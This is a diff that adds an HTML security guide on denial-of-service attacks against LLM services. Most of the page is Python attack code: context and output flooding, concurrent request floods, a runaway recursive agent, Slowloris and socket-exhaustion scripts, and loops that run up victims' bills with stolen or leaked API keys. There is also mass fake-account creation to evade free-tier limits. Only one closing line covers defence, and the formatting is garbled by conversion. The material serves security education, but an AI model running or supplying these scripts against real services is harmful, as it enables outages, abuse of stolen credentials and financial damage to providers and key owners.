@@ -215,7 +215,804 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>LLM04: Model Denial of Service - Attack Vectors</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#attack-overview">Attack Overview</a></li>
+<li><a href="#attack-techniques">Attack Techniques</a></li>
+<li><a href="#resource-exhaustion-vectors">Resource Exhaustion Vectors</a></li>
+<li><a href="#cost-exploitation-vectors">Cost Exploitation Vectors</a></li>
+<li><a href="#queue-saturation-vectors">Queue Saturation Vectors</a></li>
+<li><a href="#advanced-attack-patterns">Advanced Attack Patterns</a></li>
+<li><a href="#attack-chains">Attack Chains</a></li>
+<li><a href="#real-world-examples">Real-World Examples</a></li>
+</ul>
+
+<h2>Attack Overview</h2>
+
+<p>Model Denial of Service attacks exploit the resource-intensive nature of Large Language Models to degrade service quality, exhaust computational resources, or cause financial damage through excessive API costs.</p>
+
+<h3>Attack Flow</h3>
+
+<p>``<code></p>
+<p>[Attacker] → [Malicious Input] → [LLM Processing] → [Resource Exhaustion]</p>
+<p>     ↓            ↓                    ↓                    ↓</p>
+<p>  Identify      Craft input         Model processes    Service degradation</p>
+<p>  weakness      patterns            expensive ops      System failure</p>
+</code>`<code>
+
+<h3>Attack Prerequisites</h3>
+
+<ol>
+<li><strong>Access to LLM Service</strong>: Ability to send requests to the model</li>
+<li><strong>Understanding of Resource Costs</strong>: Knowledge of expensive operations</li>
+<li><strong>Lack of Rate Limiting</strong>: Insufficient request throttling</li>
+<li><strong>Unbounded Resource Allocation</strong>: No limits on computation per request</li>
+</ol>
+
+<h2>Attack Techniques</h2>
+
+<h3>Technique 1: Maximum Context Exploitation</h3>
+
+<strong>Objective</strong>: Consume maximum computational resources per request
+
+<strong>Method</strong>:
+</code>`<code>
+<ol>
+<li>Identify maximum context length (e.g., 128K tokens)</li>
+<li>Craft input approaching maximum length</li>
+<li>Send requests with near-maximum tokens</li>
+<li>Force O(n²) attention computation</li>
+<li>Exhaust GPU/CPU resources</li>
+</ol>
+</code>`<code>
+
+<strong>Example Attack</strong>:
+</code>`<code>python
+<h1>Craft maximum-length malicious input</h1>
+<p>def create_max_context_attack():</p>
+<p>    # Find maximum token limit</p>
+<p>    max_tokens = 128000  # GPT-4 Turbo limit</p>
+    
+<p>    # Create input approaching limit</p>
+<p>    # Use repetitive but valid content</p>
+<p>    attack_input = ""</p>
+<p>    base_text = "Analyze this important information: "</p>
+    
+<p>    # Fill to near maximum</p>
+<p>    while len(tokenize(attack_input)) < max_tokens - 1000:</p>
+<p>        attack_input += base_text + "data " * 100 + "\n"</p>
+    
+<p>    return attack_input</p>
+
+<h1>Launch attack</h1>
+<p>malicious_input = create_max_context_attack()</p>
+<p>response = llm_api.generate(malicious_input)  # Consumes massive resources</p>
+
+<h1>Impact:</h1>
+<h1>- GPU/CPU saturated for extended period</h1>
+<h1>- Memory allocation spikes</h1>
+<h1>- Other requests queued or rejected</h1>
+<h1>- Potential system crash</h1>
+</code>`<code>
+
+<h3>Technique 2: Output Length Exploitation</h3>
+
+<strong>Objective</strong>: Force generation of extremely long responses
+
+<strong>Method</strong>:
+</code>`<code>
+<ol>
+<li>Request maximum output length</li>
+<li>Use prompts that encourage verbosity</li>
+<li>Request enumeration or listing tasks</li>
+<li>Force sequential token generation</li>
+<li>Tie up model for extended periods</li>
+</ol>
+</code>`<code>
+
+<strong>Example Attack</strong>:
+</code>`<code>python
+<h1>Request maximum output generation</h1>
+<p>def output_length_attack():</p>
+<p>    prompts = [</p>
+<p>        "List all prime numbers from 1 to 1000000 with detailed explanation for each",</p>
+<p>        "Write a comprehensive 50000-word analysis of...",</p>
+<p>        "Enumerate every possible combination of...",</p>
+<p>        "Generate code for every edge case in...",</p>
+<p>        "Translate the following 10000-word text to 100 languages..."</p>
+<p>    ]</p>
+    
+<p>    for prompt in prompts:</p>
+<p>        # Request maximum tokens</p>
+<p>        response = llm_api.generate(</p>
+<p>            prompt=prompt,</p>
+<p>            max_tokens=100000,  # Maximum possible</p>
+<p>            temperature=0.7</p>
+<p>        )</p>
+    
+<p>    # Impact:</p>
+<p>    # - Sequential generation takes minutes</p>
+<p>    # - Resources locked during entire generation</p>
+<p>    # - Multiple concurrent attacks overwhelm system</p>
+<p>    # - Token costs maximized</p>
+
+<h1>Automated flood attack</h1>
+<p>import asyncio</p>
+
+<p>async def sustained_output_attack():</p>
+<p>    tasks = []</p>
+<p>    for i in range(100):  # 100 concurrent expensive requests</p>
+<p>        task = asyncio.create_task(</p>
+<p>            llm_api.generate(</p>
+<p>                "Write maximum length detailed analysis...",</p>
+<p>                max_tokens=100000</p>
+<p>            )</p>
+<p>        )</p>
+<p>        tasks.append(task)</p>
+    
+<p>    await asyncio.gather(*tasks)</p>
+</code>`<code>
+
+<h3>Technique 3: Complex Computation Requests</h3>
+
+<strong>Objective</strong>: Request computationally intensive operations
+
+<strong>Method</strong>:
+</code>`<code>
+<ol>
+<li>Request nested analysis operations</li>
+<li>Ask for multi-step reasoning</li>
+<li>Demand cross-referencing tasks</li>
+<li>Request combinatorial computations</li>
+<li>Force repeated passes over content</li>
+</ol>
+</code>`<code>
+
+<strong>Example Attack</strong>:
+</code>`<code>python
+<h1>Computationally expensive prompt</h1>
+<p>complex_attack = """</p>
+<p>Given the following 5000-word document [insert document]:</p>
+
+<p>For EACH word in the document:</p>
+<ol>
+<li>Provide complete etymology</li>
+<li>List all synonyms and antonyms</li>
+<li>Show usage examples from literature (10 examples each)</li>
+<li>Translate to 50 languages</li>
+<li>Analyze semantic relationships with other words in document</li>
+<li>Generate related metaphors and idioms</li>
+<li>Provide pronunciation in IPA</li>
+<li>Show historical usage trends</li>
+</ol>
+
+<p>Then:</p>
+<ul>
+<li>Cross-reference all semantic relationships</li>
+<li>Build complete ontology</li>
+<li>Generate visualization descriptions</li>
+<li>Create comprehensive index</li>
+</ul>
+<p>"""</p>
+
+<p>response = llm.generate(complex_attack)</p>
+
+<h1>Impact:</h1>
+<h1>- Requires multiple passes over content</h1>
+<h1>- Complex reasoning chains</h1>
+<h1>- Large intermediate representations</h1>
+<h1>- Extreme memory usage</h1>
+<h1>- CPU/GPU intensive computation</h1>
+</code>`<code>
+
+<h3>Technique 4: Recursive Prompt Injection</h3>
+
+<strong>Objective</strong>: Create recursive or exponential computation
+
+<strong>Method</strong>:
+</code>`<code>
+<ol>
+<li>Inject prompts that generate new prompts</li>
+<li>Create self-referential instructions</li>
+<li>Build recursive task decomposition</li>
+<li>Force looping behaviors</li>
+<li>Exhaust stack or memory</li>
+</ol>
+</code>`<code>
+
+<strong>Example Attack</strong>:
+</code>`<code>python
+<h1>Recursive prompt that creates DoS</h1>
+<p>recursive_attack = """</p>
+<p>Task: Break down this task into 10 subtasks.</p>
+<p>For each subtask, break it down into 10 more subtasks.</p>
+<p>For each of those, break it down into 10 more subtasks.</p>
+<p>Continue until you've created a complete task hierarchy.</p>
+
+<p>Then execute all subtasks in sequence.</p>
+<p>"""</p>
+
+<h1>In autonomous agent system</h1>
+<p>def vulnerable_agent(task):</p>
+<p>    response = llm.generate(task)</p>
+    
+<p>    # Agent processes subtasks recursively</p>
+<p>    if "subtask:" in response:</p>
+<p>        subtasks = extract_subtasks(response)</p>
+<p>        for subtask in subtasks:</p>
+<p>            vulnerable_agent(subtask)  # Recursive call - no depth limit!</p>
+
+<p>vulnerable_agent(recursive_attack)</p>
+
+<h1>Impact:</h1>
+<h1>- Exponential task explosion (10^n tasks)</h1>
+<h1>- Stack overflow</h1>
+<h1>- Memory exhaustion</h1>
+<h1>- Infinite processing loop</h1>
+</code>`<code>
+
+<h2>Resource Exhaustion Vectors</h2>
+
+<h3>Vector 1: Memory Saturation</h3>
+
+<strong>Goal</strong>: Exhaust available memory
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Concurrent large context attacks</h1>
+<p>import threading</p>
+
+<p>def memory_exhaustion_attack():</p>
+<p>    def send_large_request():</p>
+<p>        # Each request requires significant memory</p>
+<p>        large_input = "context " * 50000  # ~50K tokens</p>
+<p>        llm_api.generate(</p>
+<p>            prompt=large_input,</p>
+<p>            max_tokens=50000  # Large output too</p>
+<p>        )</p>
+    
+<p>    # Launch many concurrent requests</p>
+<p>    threads = []</p>
+<p>    for i in range(100):  # 100 concurrent requests</p>
+<p>        t = threading.Thread(target=send_large_request)</p>
+<p>        t.start()</p>
+<p>        threads.append(t)</p>
+    
+<p>    for t in threads:</p>
+<p>        t.join()</p>
+
+<h1>Impact:</h1>
+<h1>Memory per request: ~5-10GB (model + context + activations)</h1>
+<h1>100 concurrent: 500GB - 1TB memory required</h1>
+<h1>System runs out of memory</h1>
+<h1>Crashes or starts swapping (further degradation)</h1>
+</code>`<code>
+
+<h3>Vector 2: GPU Compute Exhaustion</h3>
+
+<strong>Goal</strong>: Saturate GPU compute resources
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Maximize GPU utilization</h1>
+<p>def gpu_exhaustion_attack():</p>
+<p>    # Characteristics that maximize GPU usage:</p>
+<p>    # 1. Large context (quadratic attention)</p>
+<p>    # 2. Maximum batch size</p>
+<p>    # 3. Continuous requests</p>
+    
+<p>    def expensive_request():</p>
+<p>        # Large context for quadratic attention complexity</p>
+<p>        context = "word " * 100000  # 100K tokens</p>
+        
+<p>        # Complex reasoning task</p>
+<p>        prompt = f"""</p>
+<p>        Analyze every word in the following text.</p>
+<p>        For each word, perform deep semantic analysis.</p>
+<p>        Text: {context}</p>
+<p>        """</p>
+        
+<p>        return llm_api.generate(prompt, max_tokens=10000)</p>
+    
+<p>    # Flood with expensive requests</p>
+<p>    while True:</p>
+<p>        # No delay between requests</p>
+<p>        expensive_request()</p>
+
+<h1>Impact:</h1>
+<h1>- GPU utilization at 100%</h1>
+<h1>- Request queue builds up</h1>
+<h1>- Legitimate requests timeout</h1>
+<h1>- Service effectively unavailable</h1>
+</code>`<code>
+
+<h3>Vector 3: Token Generation Slowdown</h3>
+
+<strong>Goal</strong>: Tie up inference resources with slow token generation
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Force slow, sequential token generation</h1>
+<p>def slow_generation_attack():</p>
+<p>    prompts = [</p>
+<p>        # Requests that require many tokens</p>
+<p>        "Count from 1 to 1000000 in words",</p>
+<p>        "List every city in the world with population data",</p>
+<p>        "Generate complete dictionary with definitions",</p>
+        
+<p>        # Requests requiring careful generation (slower)</p>
+<p>        "Write valid JSON with 10000 nested objects",</p>
+<p>        "Generate syntactically perfect code for...",</p>
+<p>        "Produce mathematically accurate tables of..."</p>
+<p>    ]</p>
+    
+<p>    # Each token generated sequentially</p>
+<p>    # Can't parallelize token generation</p>
+<p>    # Low temperature = more careful = slower</p>
+    
+<p>    for prompt in prompts:</p>
+<p>        llm_api.generate(</p>
+<p>            prompt=prompt,</p>
+<p>            max_tokens=50000,</p>
+<p>            temperature=0.1,  # Low temp = slower but more precise</p>
+<p>            top_p=0.9</p>
+<p>        )</p>
+
+<h1>Impact:</h1>
+<h1>- Token generation is sequential</h1>
+<h1>- 50K tokens at ~50 tokens/sec = 16+ minutes per request</h1>
+<h1>- Multiple concurrent = hours of compute time</h1>
+<h1>- Resources locked during entire generation</h1>
+</code>`<code>
+
+<h2>Cost Exploitation Vectors</h2>
+
+<h3>Vector 1: Token Cost Maximization</h3>
+
+<strong>Goal</strong>: Maximize API costs for victim
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Exploit pay-per-token pricing</h1>
+<p>def cost_exploitation_attack(stolen_api_key):</p>
+<p>    # GPT-4 pricing (example):</p>
+<p>    # Input: $0.03 per 1K tokens</p>
+<p>    # Output: $0.06 per 1K tokens</p>
+    
+<p>    import requests</p>
+    
+<p>    headers = {</p>
+<p>        "Authorization": f"Bearer {stolen_api_key}"</p>
+<p>    }</p>
+    
+<p>    # Maximize both input and output tokens</p>
+<p>    def expensive_request():</p>
+<p>        # Large input (approaching max context)</p>
+<p>        input_text = "analyze this: " + ("data " * 50000)  # ~50K input tokens</p>
+        
+<p>        return requests.post(</p>
+<p>            "https://api.openai.com/v1/chat/completions",</p>
+<p>            headers=headers,</p>
+<p>            json={</p>
+<p>                "model": "gpt-4",</p>
+<p>                "messages": [{"role": "user", "content": input_text}],</p>
+<p>                "max_tokens": 100000  # Maximum output</p>
+<p>            }</p>
+<p>        )</p>
+    
+<p>    # Automated continuous attack</p>
+<p>    while True:</p>
+<p>        expensive_request()</p>
+<p>        # Each request: ~50K input + ~100K output = 150K tokens</p>
+<p>        # Cost per request: (50 <em> 0.03) + (100 </em> 0.06) = $7.50</p>
+<p>        # 1000 requests = $7,500</p>
+<p>        # 24 hours at 1 req/sec = 86,400 requests = $648,000</p>
+
+<h1>Impact:</h1>
+<h1>- Massive unexpected bills</h1>
+<h1>- Budget exhaustion</h1>
+<h1>- Service shutdown due to cost limits</h1>
+<h1>- Financial damage to organization</h1>
+</code>`<code>
+
+<h3>Vector 2: API Key Abuse</h3>
+
+<strong>Goal</strong>: Use leaked/stolen API keys to maximize costs
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Exploit leaked API key found in GitHub</h1>
+<p>def api_key_abuse():</p>
+<p>    # Attacker finds API key in:</p>
+<p>    # - Public GitHub repository</p>
+<p>    # - Exposed .env file</p>
+<p>    # - Hardcoded in mobile app</p>
+<p>    # - Leaked in error messages</p>
+    
+<p>    compromised_key = "sk-proj-xxxxxxxxxxxxx"</p>
+    
+<p>    # Setup distributed attack</p>
+<p>    import multiprocessing</p>
+    
+<p>    def worker(key):</p>
+<p>        while True:</p>
+<p>            try:</p>
+<p>                # Maximum cost request</p>
+<p>                llm_api.generate(</p>
+<p>                    api_key=key,</p>
+<p>                    prompt="x " * 100000,  # Max input</p>
+<p>                    max_tokens=100000,     # Max output</p>
+<p>                    model="gpt-4"          # Most expensive</p>
+<p>                )</p>
+<p>            except:</p>
+<p>                pass  # Continue on errors</p>
+    
+<p>    # Distribute across multiple processes</p>
+<p>    processes = []</p>
+<p>    for i in range(multiprocessing.cpu_count()):</p>
+<p>        p = multiprocessing.Process(target=worker, args=(compromised_key,))</p>
+<p>        p.start()</p>
+<p>        processes.append(p)</p>
+
+<h1>Impact:</h1>
+<h1>- Runs continuously 24/7</h1>
+<h1>- Maximizes parallelism</h1>
+<h1>- Costs accumulate rapidly</h1>
+<h1>- May go unnoticed for days/weeks</h1>
+</code>`<code>
+
+<h3>Vector 3: Free Tier Exploitation</h3>
+
+<strong>Goal</strong>: Abuse free tier or trial accounts
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Create multiple accounts to bypass limits</h1>
+<p>def free_tier_abuse():</p>
+<p>    import random</p>
+<p>    import string</p>
+    
+<p>    def generate_fake_email():</p>
+<p>        random_string = ''.join(random.choices(string.ascii_lowercase, k=10))</p>
+<p>        return f"{random_string}@tempmail.com"</p>
+    
+<p>    # Automate account creation</p>
+<p>    def create_account():</p>
+<p>        email = generate_fake_email()</p>
+<p>        # Use temporary email services</p>
+<p>        # Automated signup flow</p>
+<p>        api_key = signup_and_get_key(email)</p>
+<p>        return api_key</p>
+    
+<p>    # Create many accounts</p>
+<p>    api_keys = []</p>
+<p>    for i in range(100):</p>
+<p>        try:</p>
+<p>            key = create_account()</p>
+<p>            api_keys.append(key)</p>
+<p>        except:</p>
+<p>            pass</p>
+    
+<p>    # Rotate through keys</p>
+<p>    def rotating_attack():</p>
+<p>        key_index = 0</p>
+<p>        while True:</p>
+<p>            current_key = api_keys[key_index % len(api_keys)]</p>
+            
+<p>            try:</p>
+<p>                # Use up free tier quota</p>
+<p>                llm_api.generate(</p>
+<p>                    api_key=current_key,</p>
+<p>                    prompt="generate content " * 10000,</p>
+<p>                    max_tokens=10000</p>
+<p>                )</p>
+<p>            except:</p>
+<p>                # Switch to next key when quota exhausted</p>
+<p>                key_index += 1</p>
+    
+<p>    rotating_attack()</p>
+
+<h1>Impact:</h1>
+<h1>- Bypass rate limits via multiple accounts</h1>
+<h1>- Abuse free tier allocations</h1>
+<h1>- Resource exhaustion for provider</h1>
+<h1>- Financial loss from free tier abuse</h1>
+</code>`<code>
+
+<h2>Queue Saturation Vectors</h2>
+
+<h3>Vector 1: Request Queue Flooding</h3>
+
+<strong>Goal</strong>: Fill request queue to block legitimate users
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Flood request queue</h1>
+<p>def queue_saturation_attack():</p>
+<p>    import asyncio</p>
+    
+<p>    async def send_request():</p>
+<p>        # Not necessarily expensive requests</p>
+<p>        # Just high volume</p>
+<p>        await llm_api.generate_async(</p>
+<p>            prompt="Hello, how are you?",</p>
+<p>            max_tokens=100</p>
+<p>        )</p>
+    
+<p>    async def flood():</p>
+<p>        # Create massive number of concurrent requests</p>
+<p>        tasks = []</p>
+<p>        for i in range(100000):  # 100K requests</p>
+<p>            task = asyncio.create_task(send_request())</p>
+<p>            tasks.append(task)</p>
+        
+<p>        await asyncio.gather(*tasks, return_exceptions=True)</p>
+    
+<p>    asyncio.run(flood())</p>
+
+<h1>Impact:</h1>
+<h1>- Request queue fills up</h1>
+<h1>- Queue size limit reached</h1>
+<h1>- New requests rejected (including legitimate ones)</h1>
+<h1>- Service appears unavailable to real users</h1>
+<h1>- Timeout cascades as queued requests expire</h1>
+</code>`<code>
+
+<h3>Vector 2: Connection Pool Exhaustion</h3>
+
+<strong>Goal</strong>: Exhaust available connections
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Hold connections open</h1>
+<p>def connection_exhaustion():</p>
+<p>    import socket</p>
+    
+<p>    connections = []</p>
+    
+<p>    # Open many connections</p>
+<p>    for i in range(10000):</p>
+<p>        try:</p>
+<p>            # Establish connection</p>
+<p>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
+<p>            sock.connect(('api.llm-service.com', 443))</p>
+            
+<p>            # Send incomplete request (keep connection open)</p>
+<p>            sock.send(b'POST /v1/completions HTTP/1.1\r\n')</p>
+<p>            # Don't complete the request</p>
+<p>            # Connection stays open</p>
+            
+<p>            connections.append(sock)</p>
+<p>        except:</p>
+<p>            pass</p>
+    
+<p>    # Keep connections alive</p>
+<p>    while True:</p>
+<p>        pass  # Don't close connections</p>
+
+<h1>Impact:</h1>
+<h1>- Connection pool exhausted</h1>
+<h1>- New connections cannot be established</h1>
+<h1>- Legitimate users cannot connect</h1>
+<h1>- Service unavailable</h1>
+</code>`<code>
+
+<h2>Advanced Attack Patterns</h2>
+
+<h3>Pattern 1: Slowloris-Style LLM Attack</h3>
+
+<strong>Goal</strong>: Send slow requests to tie up resources
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Slow request attack</h1>
+<p>def slowloris_llm_attack():</p>
+<p>    import time</p>
+    
+<p>    def slow_request():</p>
+<p>        # Open connection</p>
+<p>        connection = establish_connection()</p>
+        
+<p>        # Send prompt very slowly (byte by byte)</p>
+<p>        prompt = "Analyze this: " + ("data " * 50000)</p>
+        
+<p>        for char in prompt:</p>
+<p>            connection.send(char.encode())</p>
+<p>            time.sleep(0.1)  # Delay between characters</p>
+        
+<p>        # Request sits in parsing buffer</p>
+<p>        # Resources tied up waiting for complete request</p>
+    
+<p>    # Launch many slow requests</p>
+<p>    import threading</p>
+<p>    threads = []</p>
+<p>    for i in range(1000):</p>
+<p>        t = threading.Thread(target=slow_request)</p>
+<p>        t.start()</p>
+<p>        threads.append(t)</p>
+
+<h1>Impact:</h1>
+<h1>- Connections held open for extended periods</h1>
+<h1>- Parsing buffers full</h1>
+<h1>- Thread pool exhausted</h1>
+<h1>- Cannot process legitimate requests</h1>
+</code>`<code>
+
+<h3>Pattern 2: Algorithmic Complexity Exploitation</h3>
+
+<strong>Goal</strong>: Trigger worst-case algorithmic complexity
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Craft input triggering worst-case performance</h1>
+<p>def algorithmic_complexity_attack():</p>
+<p>    # Exploit quadratic attention in transformers</p>
+<p>    # O(n²) complexity in attention mechanism</p>
+    
+<p>    # Maximum length with maximum cross-token dependencies</p>
+<p>    attack_prompt = """</p>
+<p>    Please analyze the relationships between every pair of words below.</p>
+<p>    For each pair, explain how they relate semantically, grammatically, </p>
+<p>    and contextually. Cross-reference all relationships.</p>
+    
+<p>    Words: [10000 carefully chosen words with complex relationships]</p>
+<p>    """</p>
+    
+<p>    llm.generate(attack_prompt)</p>
+    
+<p>    # Attention computation:</p>
+<p>    # For n=10000 tokens: ~100,000,000 attention operations</p>
+<p>    # GPU memory for attention matrix: ~400MB per layer</p>
+<p>    # Multiple layers: several GB just for attention</p>
+
+<h1>Impact:</h1>
+<h1>- Worst-case O(n²) computation triggered</h1>
+<h1>- Memory usage spikes</h1>
+<h1>- Processing time extends dramatically</h1>
+<h1>- Single request can consume all GPU memory</h1>
+</code>`<code>
+
+<h3>Pattern 3: Model Thrashing</h3>
+
+<strong>Goal</strong>: Force constant model loading/unloading
+
+<strong>Attack Pattern</strong>:
+</code>`<code>python
+<h1>Force model switching</h1>
+<p>def model_thrashing_attack():</p>
+<p>    # If service supports multiple models</p>
+<p>    models = [</p>
+<p>        "gpt-3.5-turbo",</p>
+<p>        "gpt-4",</p>
+<p>        "claude-3-opus",</p>
+<p>        "claude-3-sonnet",</p>
+<p>        "llama-70b",</p>
+<p>        "mixtral-8x7b"</p>
+<p>    ]</p>
+    
+<p>    import random</p>
+    
+<p>    while True:</p>
+<p>        # Rapidly switch between models</p>
+<p>        model = random.choice(models)</p>
+        
+<p>        llm_api.generate(</p>
+<p>            model=model,</p>
+<p>            prompt="Hello",</p>
+<p>            max_tokens=10</p>
+<p>        )</p>
+        
+<p>        # If models aren't all loaded in memory simultaneously,</p>
+<p>        # this forces constant loading/unloading</p>
+<p>        # High overhead, poor cache utilization</p>
+
+<h1>Impact:</h1>
+<h1>- Model loading/unloading overhead</h1>
+<h1>- Cache thrashing</h1>
+<h1>- Memory fragmentation</h1>
+<h1>- Reduced throughput</h1>
+<h1>- Increased latency for all users</h1>
+</code>`<code>
+
+<h2>Attack Chains</h2>
+
+<h3>Chain 1: Reconnaissance → Exploitation → Cost Damage</h3>
+
+</code>`<code>
+<p>[Reconnaissance]</p>
+<p>    ↓</p>
+<p>Find API endpoint and authentication method</p>
+<p>    ↓</p>
+<p>[Credential Acquisition]</p>
+<p>    ↓</p>
+<p>Search GitHub for leaked keys</p>
+<p>    ↓</p>
+<p>[Validation]</p>
+<p>    ↓</p>
+<p>Test key with small requests</p>
+<p>    ↓</p>
+<p>[Exploitation]</p>
+<p>    ↓</p>
+<p>Launch maximum-cost automated attack</p>
+<p>    ↓</p>
+<p>[Cost Damage]</p>
+<p>    ↓</p>
+<p>Victim receives massive unexpected bill</p>
+</code>`<code>
+
+<h3>Chain 2: Access → Rate Limit Discovery → Bypass</h3>
+
+</code>`<code>
+<p>[Initial Access]</p>
+<p>    ↓</p>
+<p>Create legitimate account</p>
+<p>    ↓</p>
+<p>[Testing]</p>
+<p>    ↓</p>
+<p>Discover rate limits through testing</p>
+<p>    ↓</p>
+<p>[Bypass Strategy]</p>
+<p>    ↓</p>
+<p>Create multiple accounts / IP rotation</p>
+<p>    ↓</p>
+<p>[Distributed Attack]</p>
+<p>    ↓</p>
+<p>Flood from multiple accounts/IPs</p>
+<p>    ↓</p>
+<p>[Service Degradation]</p>
+<p>    ↓</p>
+<p>Legitimate users experience slowdown/unavailability</p>
+</code>``
+
+<h2>Real-World Examples</h2>
+
+<h3>Example 1: ChatGPT Capacity Issues (2023)</h3>
+
+<strong>Attack</strong>: Combination of high legitimate demand and potential abuse
+
+<strong>Method</strong>:
+<ul>
+<li>Extreme concurrent user load</li>
+<li>Complex queries consuming disproportionate resources</li>
+<li>No per-user rate limiting initially</li>
+<li>Queue saturation</li>
+</ul>
+
+<strong>Impact</strong>: Multiple extended outages, poor user experience
+
+<h3>Example 2: Hugging Face Model DoS (2023)</h3>
+
+<strong>Attack</strong>: Researchers demonstrated DoS via adversarial inputs
+
+<strong>Method</strong>:
+<ul>
+<li>Crafted inputs causing extreme memory usage</li>
+<li>Triggered worst-case model behavior</li>
+<li>Caused out-of-memory errors</li>
+</ul>
+
+<strong>Impact</strong>: Proof of concept for model-specific DoS attacks
+
+<h3>Example 3: API Key Leakage Cost Explosion</h3>
+
+<strong>Attack</strong>: Leaked API keys used for crypto mining-style abuse
+
+<strong>Method</strong>:
+<ul>
+<li>API keys found in public GitHub repos</li>
+<li>Automated scripts maximizing token usage</li>
+<li>Ran for days/weeks unnoticed</li>
+<li>Used most expensive models (GPT-4)</li>
+</ul>
+
+<strong>Impact</strong>: Organizations receiving bills of $50K - $200K+
+
+<p>---</p>
+
+<strong>Key Defense</strong>: Implement comprehensive rate limiting, input validation, resource quotas, cost monitoring, and timeout mechanisms to prevent DoS attacks from degrading service quality or causing financial damage.
+
         </div>
     </div>
 </body>
